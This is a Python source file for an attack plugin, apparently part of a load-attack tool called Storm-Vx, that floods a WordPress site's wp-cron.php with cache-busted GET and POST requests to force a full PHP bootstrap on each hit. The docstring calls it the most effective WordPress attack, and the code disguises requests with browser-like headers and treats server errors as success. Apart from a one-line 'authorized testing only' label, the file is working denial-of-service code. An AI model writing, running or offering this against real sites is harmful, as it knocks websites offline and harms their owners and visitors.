#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
vf_wp_cron_bomb — WordPress wp-cron.php Bomb Attack Plugin

wp-cron.php is the HEAVIEST uncached endpoint in WordPress:
- Spawns a full PHP process on every request (no caching possible)
- Executes all scheduled hooks (wp_loaded event chain)
- Triggers DB queries for pending scheduled tasks
- Each request = full WordPress bootstrap + PHP process + DB queries

This is the single most effective WordPress attack because:
1. wp-cron.php is ALWAYS dynamic (never cached by any CDN/plugin)
2. WordPress loads fully on each request
3. Even with DISABLE_WP_CRON, the file still runs PHP
4. Default: wp-cron runs on EVERY page load = already CPU-heavy
5. Direct hit: wp-cron.php?doing_wp_cron=<timestamp> = 100% CPU per request

Amplification: ~5x per request (full PHP bootstrap + scheduled tasks + DB)

Part of the Storm-Vx plugin architecture.

FOR AUTHORIZED TESTING ONLY!
"""

from __future__ import annotations

import asyncio
import time
import random
from typing import Dict, Any

import aiohttp

from plugin_system import PluginMeta, AttackContext
from tester.vf_attack_base import AttackPlugin, ResponseClass
from vf_common import rand_str, rand_cache_bust

from logging_config import get_logger
logger = get_logger(__name__)


__all__ = ["WpCronBombPlugin"]


class WpCronBombPlugin(AttackPlugin):
    """WordPress wp-cron.php bomb — forces full PHP process per request.

    Hits wp-cron.php with cache-busting timestamps, forcing WordPress
    to execute a full PHP bootstrap + scheduled task processing on
    every single request. This is the heaviest uncached WordPress endpoint.

    Amplification: ~5x (full PHP process + scheduled hooks + DB queries)
    """

    meta = PluginMeta(
        name='wp_cron_bomb',
        version='1.0.0',
        plugin_type='attack',
        description='WordPress wp-cron.php bomb — full PHP process per request (5x amplification)',
        tags=['http', 'wordpress', 'cron', 'cpu-burn', 'amplification'],
        priority=18,
        compatible_profiles=[],
        requirements=['aiohttp'],
    )

    async def _worker_loop(self, context: AttackContext, worker_id: int) -> None:
        """wp-cron.php bomb worker: force full PHP process per request."""
        _ssl = context.ssl_param
        site_root = context.site_root
        domain = context.domain
        delay_ms = context.extra.delay_ms

        # wp-cron.php endpoint — always dynamic
        base_url = f"{site_root}/wp-cron.php"

        while not self._stop_event.is_set():
            try:
                # Cache bust with doing_wp_cron parameter (WP-native param)
                # WordPress checks for this parameter and uses it for cron locking
                # Each unique timestamp forces a new cron spawn attempt
                cron_ts = f"{int(time.time())}.{random.randint(100000, 999999)}"  # wall-clock
                url = f"{base_url}?doing_wp_cron={cron_ts}"

                # Additional cache busting
                url += f"&{rand_cache_bust()}"

                # Use document-type headers (looks like a real browser visit)
                headers = self._get_fresh_headers(context, "document")

                # Sometimes POST wp-cron.php (triggers WP cron spawn check)
                # Sometimes GET (triggers WP cron check via query param)
                use_post = random.random() < 0.3

                t = time.monotonic()
                try:
                    if use_post:
                        headers["Content-Type"] = "application/x-www-form-urlencoded"
                        async with context.session.post(
                            url, headers=headers,
                            data=f"wp-cron={rand_str(8)}",
                            ssl=_ssl, allow_redirects=False,
                        ) as resp:
                            rt = time.monotonic() - t
                            resp_headers = dict(resp.headers)
                            response_class = self._process_response(
                                resp.status, resp_headers,
                                url=url[:60], worker_id=worker_id
                            )
                            ok = response_class in (
                                ResponseClass.OK, ResponseClass.AUTH_REQUIRED,
                                ResponseClass.REDIRECT, ResponseClass.SERVER_ERROR
                            )
                            # SERVER_ERROR = 5xx = wp-cron is processing (attack working!)
                            self._capture_response_cookies(resp, context)
                            await self._record(
                                "WP-CRON", ok, resp.status, rt,
                                url=url[:60], hint="wp-cron.php",
                            )
                    else:
                        async with context.session.get(
                            url, headers=headers,
                            ssl=_ssl, allow_redirects=False,
                        ) as resp:
                            rt = time.monotonic() - t
                            resp_headers = dict(resp.headers)
                            response_class = self._process_response(
                                resp.status, resp_headers,
                                url=url[:60], worker_id=worker_id
                            )
                            ok = response_class in (
                                ResponseClass.OK, ResponseClass.AUTH_REQUIRED,
                                ResponseClass.REDIRECT, ResponseClass.SERVER_ERROR
                            )
                            self._capture_response_cookies(resp, context)
                            await self._record(
                                "WP-CRON", ok, resp.status, rt,
                                url=url[:60], hint="wp-cron.php",
                            )
                except asyncio.CancelledError:
                    raise
                except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                    rt = time.monotonic() - t
                    self._on_request_result(worker_id, False)
                    await self._record(
                        "WP-CRON", False, 0, rt,
                        err=type(exc).__name__, url=url[:60],
                    )

                # Adaptive sleep
                await self._adaptive_sleep(worker_id, delay_ms)

            except asyncio.CancelledError:
                return
            except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                self._on_request_result(worker_id, False)
                await self._record("WP-CRON", False, 0, 0, err=type(exc).__name__)
                await asyncio.sleep(0.1)
